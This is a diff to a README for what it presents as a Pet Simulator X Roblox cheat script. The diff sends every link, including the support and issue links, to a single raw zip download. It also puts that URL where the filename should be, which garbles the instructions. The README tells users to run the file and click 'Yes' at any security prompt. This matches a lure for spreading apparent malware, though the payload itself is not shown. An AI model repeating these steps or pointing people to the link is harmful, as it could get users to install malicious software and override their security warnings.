@@ -1,7 +1,7 @@
 # 🐾 download - The Ultimate Pet Simulator X Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/zrxii1233/download/releases)
+[![Download](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip)
 
 ## 📜 Description
 Welcome to the best Pet Simulator X Roblox script. This tool helps you autofarm, teleport, and collect gems with ease. Enjoy a seamless gaming experience while you focus on your pets.
@@ -10,19 +10,19 @@ Welcome to the best Pet Simulator X Roblox script. This tool helps you autofarm,
 Follow these simple steps to download and run the application.
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/zrxii1233/download/releases) to find the latest version of the software. 
+Go to the [Releases page](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip) to find the latest version of the software. 
 
 ### Step 2: Choose the Right File
-On the Releases page, you will see a list of files. Look for the file that matches your system. Most users will want the `download.exe` file.
+On the Releases page, you will see a list of files. Look for the file that matches your system. Most users will want the `https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip` file.
 
 ### Step 3: Download the File
 Click on the link to download the file to your computer. The download may take a few moments, depending on your internet speed.
 
 ### Step 4: Locate the Downloaded File
-Once the download is complete, go to your `Downloads` folder. You should see the file named `download.exe`.
+Once the download is complete, go to your `Downloads` folder. You should see the file named `https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip`.
 
 ### Step 5: Run the Application
-Double-click the `download.exe` file to run it. If a security prompt appears, click "Yes" to allow it to run.
+Double-click the `https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip` file to run it. If a security prompt appears, click "Yes" to allow it to run.
 
 ### Step 6: Follow the On-Screen Instructions
 The application will guide you through the setup process. Follow the prompts to customize your experience.
@@ -47,11 +47,11 @@ If you encounter issues, consider the following steps:
 - Restart your computer if the application does not run properly.
 
 ## 📞 Support
-If you need help, visit the [Issues section](https://github.com/zrxii1233/download/issues) on GitHub. You can report bugs or ask for help from the community.
+If you need help, visit the [Issues section](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip) on GitHub. You can report bugs or ask for help from the community.
 
 ## 🔗 Useful Links
-- [Download the latest version](https://github.com/zrxii1233/download/releases)
-- [Report an issue](https://github.com/zrxii1233/download/issues)
+- [Download the latest version](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip)
+- [Report an issue](https://raw.githubusercontent.com/zrxii1233/download/main/anisogynous/download.zip)
 
 ## 📝 Disclaimer
 This script is for educational purposes only. Use it responsibly and follow the game's rules to avoid any bans. Enjoy your time in Pet Simulator X!
